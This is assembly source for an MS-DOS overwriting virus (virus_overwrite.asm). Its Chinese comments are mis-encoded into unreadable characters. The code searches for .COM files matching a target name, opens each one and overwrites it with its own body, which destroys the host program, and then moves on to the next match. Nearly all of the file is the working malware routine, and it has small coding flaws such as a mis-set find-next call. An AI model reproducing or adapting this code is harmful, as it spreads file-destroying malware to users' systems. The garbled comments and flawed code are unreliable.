;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;	���COM�����Ͳ���
;	virus_overwrite.asm
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
.model tiny
.code
org 100h
start:
setdta:	;����DTA
		lea dx,dta		;��DTA����ʼ��ַ����dx
		mov ah,1ah		;1ah���ܵ��ã�����DTA��ַ�����ò��� ds:dx=DTA��ַ
		int 21h			;DOS�жϵ���
findf:	;�����ļ�
		mov ah,4eh		;4eh���ܵ��ã�����ƥ���ļ������� ds:dx=ASCII����ַ��cx����
		lea dx,fname	;���ļ�����ַ����dx
		mov cx,7		;ָ�������ļ����ͣ�7��ʾ���������ļ�
nextf:	int 21h			;DOS�жϵ���
		jc	notfind		;����û���ҵ��ļ���jc�ǵ�CF=1ʱ��ת
dispfn:	;��ʾ�ļ�
		lea dx,[dta+30]	;��ӡ�ļ���λ������ƫ��30���ֽڵĵط�
		push ax			;����Ҫʹ��ax������֮ǰax������
		mov ah,09h		;09h�Ź��ܵ��ã���ʾ�ַ��������ò��� ds:dx=����ַ���ַ�����'$'��β
		int 21h			;DOS�жϵ���
		pop ax			;��ԭax����
openf:	;���ļ�	
		mov ax,3d02h	;3dh���ܵ��ã����ò��� ds:dx=ASCII����ַ��al=�����ļ�����ʽ��0=����1=д��2=��/д
						;�����óɹ������ز���ax=�ļ����
		;�˴�����DXָ��Ҫ�������ļ�������Ϊ������ʾ�ļ������Ѿ�
		;������DX��ָ������Ͳ����ٴ�������
		int 21h			;DOS�жϵ���
		jc notopen		;��CF=1ʱ�ļ�û�д���ת��notopen
		xchg ax,bx		;�����ļ����ܵ��õĳ��ڲ������ļ������
pointf:	;�����ļ���дָ��
		mov ax,4200h	;42h���ܵ��ã��ƶ��ļ�ָ�룬���ò���bx=�ļ����ţ�cx:dx=λ������al=�ƶ���ʽ
		xor cx,cx		;��cx���㣬����ƫ�����ĸ�λ
		xor dx,dx		;��dx���㣬����ƫ�����ĵ�λ
		int 21h			;DOS�жϵ��ã�ƫ������Ϊ�㣬˵�����ļ����ʼ�����ǣ����ɹ� dx:ax=��ָ��λ�ã�ʧ���� ax=������
		jc	notpoint	;��CF=1ʱ���ô������ת��notpoint
		mov filesize,ax	;���ļ��Ĵ�С�����ڴ浥Ԫ�У�ax��42�Ź��ܵ��õĳ��ڲ���
writef:	;д�ļ�
		mov ah,40h		;40h���ã�д�ļ����豸��ds:dx=���ݻ�������ַ��bx=�ļ����ţ�cx=д����ֽ����������óɹ�����ax=ʵ��ʵ��д����ֽ���
		mov cx,filelen	;��Ҫд���ļ��ĳ��ȱ��浽cx�У����������ȣ�
		lea	dx,start	;����������ʼ��ַ�浽dx����
		int 21h			;DOS�жϵ���
		jc	notwrite	;��CF=1д���ļ�ʧ����ת��notwrite
closef:	;�ر��ļ�
		mov ah,3eh		;3eh���ܵ��ã��ر��ļ���bx=�ļ����
		int 21h			;DOS�ж�
		jc notclose		;��CF=1ʱ�ļ��ر�ʧ����ת��notclose
findnext:;������һ���ļ�
		mov ax,4fh		;4fh���ã�������һƥ���ļ������ò��� DAT����4eh��ԭʼ��Ϣ
		jmp	nextf		;���ؼ��������ļ�

notfind:
notopen:
notpoint:
notwrite:
notclose:
quit:	;�˳�����
			mov ah,4ch	;4ch���ã�����������ֹ������ al=������
			int 21h
			
 dta		db	44	dup(0)	;����һ��44�ֽڵĻ�����
			db	'$'			;�ַ����Ľ�������9�Ź��ܵ���Ҫ�õ�
 fname		db	'tar.com'	;��Ⱦ����������
 filesize	dw	?			;���������ļ�����
 filelen	equ	$-start		;��ǰ��ƫ����($(�Ѿ������ļ���ĩβ��))-��������ʼƫ����(start)
 end start
;����DTA�ṹ
;DTA STRUCT
;	Res DB 21 DUP (?)
;	Attrib DB ?
;	Time DW ?
;	Date DW ?
;	Bytes DD ?
;	Name DB 12 DUP (?),0
;DTA ENDS